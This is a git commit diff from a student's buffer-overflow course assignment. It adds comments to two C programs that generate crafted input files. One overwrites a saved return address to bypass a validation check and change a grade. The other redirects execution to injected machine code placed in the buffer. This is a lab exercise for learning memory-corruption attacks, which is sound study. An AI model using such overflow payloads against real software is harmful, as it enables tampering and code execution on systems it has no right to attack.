6b4fd8201f9d709c1ea45b5a547e8d3db733af90
ATHANASIOS IOANNIS XANTHOPOULOS <csd4702@ikaria.csd.uoc.gr>
2023-05-12 02:09:05 +0300

    Added comments

--- src/createdata6.c
+++ src/createdata6.c
@@ -1,3 +1,12 @@
+/*------------------------------------------------------*/
+/*              Name: Athanasios Ioannis                */
+/*              Surname: Xanthopoylos                   */
+/*              AM: 4702                                */
+/*              Date: 12-05-2023                        */
+/*              Assignment: 6                           */
+/*                                                      */
+/*           Buffer overflow attack and H4CK1NG         */
+/*------------------------------------------------------*/
 #include <stdlib.h>
 #include <stdio.h>
 
@@ -5,8 +14,10 @@
 int main(){
 	int i;
 	FILE *data6;
+	/*Create the data6 file and write in it*/
 	data6 = fopen("data6","w");
-	fputc('T',data6);
+	/*21 BYTES*/
+	fputc('T',data6);	/*Write my name in the buffer*/
 	fputc('h',data6);
         fputc('a',data6);
         fputc('n',data6);
@@ -27,30 +38,33 @@ int main(){
         fputc('l',data6);
         fputc('o',data6);
         fputc('s',data6);
-/*	fputs("Thanasis-Xanthopoulos",data6);21 Bytes*/
-	for(i = 0; i < 23; i++){	/*46 Bytes*/
-		if(i == 13){
-			fputc(0x24,data6);
+
+	/*Fill the rest of the buffer but when you reach the LS bit of
+         var i(pos=35B) make it again 35 so it doesnt reset back to i=0
+        fill everything after that with 0*/
+	for(i = 0; i < 24; i++){	/*46 Bytes*/
+		if(i == 13){	/*30+5 Bytes = LS of var i*/
+			fputc(0x23,data6);
 		}
 		fputc(0,data6);
 	}
 
-	fputc(0x98,data6);
+	fputc(0x98,data6);	/*Add the ebp but it is not needed*/
 	fputc(0xf4,data6);
 	fputc(0xff,data6);
 	fputc(0xbf,data6);
 
-	fputc(0x8e,data6);
-	fputc(0x9e,data6);
-	fputc(0x04,data6);
-	fputc(0x08,data6);
+	fputc(0x8e,data6);	/*Change the R.A. to be the next*/
+	fputc(0x9e,data6);	/*command after the if statement*/
+	fputc(0x04,data6);	/*so we completely skip the validation*/
+	fputc(0x08,data6);	/*and we change the grade to 6*/
 
-	fputc(0xdc,data6);
+	fputc(0xdc,data6);	/*Add the address of &Name back */
         fputc(0x42,data6);
         fputc(0x0e,data6);
         fputc(0x08,data6);
 
-	fprintf(data6,"\n");
+	/*Close the file*/
 	fclose(data6);
 	return 0;
 }
--- src/createdata9.c
+++ src/createdata9.c
@@ -1,14 +1,24 @@
+/*------------------------------------------------------*/
+/*              Name: Athanasios Ioannis                */
+/*              Surname: Xanthopoylos                   */
+/*              AM: 4702                                */
+/*              Date: 12-05-2023                        */
+/*              Assignment: 6                           */
+/*                                                      */
+/*           Buffer overflow attack and H4CK1NG         */
+/*------------------------------------------------------*/
+
 #include <stdlib.h>
 #include <stdio.h>
 
 int main(){
 	FILE *data9;
 	int i;
-
+	/*Create the data9 file and write in it*/
         data9 = fopen("data9","w");
 
 	/*16 BYTES*/
-	fputc('T',data9);
+	fputc('T',data9); /*Write my name in the buffer*/
         fputc('h',data9);
         fputc('a',data9);
         fputc('n',data9);
@@ -43,29 +53,31 @@ int main(){
         fputc(0xE0,data9); /*0xFF(jmp) + 0xE0(eax)*/
 			   /*2 BYTES*/
 
+	/*Fill the rest of the buffer but when you reach the LS bit of
+	 var i(pos=35B) make it again 35 so it doesnt reset back to i=0
+	fill everything after that with 0*/
 	for(i = 0; i < 15; i++){
-		if(i == 4){
+		if(i == 4){ /*30+5 Bytes = LS of var i*/
 			fputc(0x23,data9);
 		}
 		fputc(0, data9);
 	}
 
-        fputc(0x98,data9);
+        fputc(0x98,data9);	/*Add the ebp but it is not need*/
         fputc(0xf3,data9);
         fputc(0xff,data9);
         fputc(0xbf,data9);
 
-        fputc(0xEC,data9);
+        fputc(0xEC,data9);	/*Change the R.A. to go to the machine code */
+        fputc(0x42,data9);	/*saved in buffer+16 bytes. We cant access the*/
+        fputc(0x0E,data9);	/*buffer after the func ended but we have the*/
+        fputc(0x08,data9);	/*name+machine code saved in string s(Name)*/
+
+        fputc(0xDC,data9);	/*Add the address of &Name back */
         fputc(0x42,data9);
         fputc(0x0E,data9);
         fputc(0x08,data9);
-
-        fputc(0xDC,data9);
-        fputc(0x42,data9);
-        fputc(0x0E,data9);
-        fputc(0x08,data9);
-
-	fprintf(data9,"\n");
+	/*Close the file*/
 	fclose(data9);
 	return 0;
 }
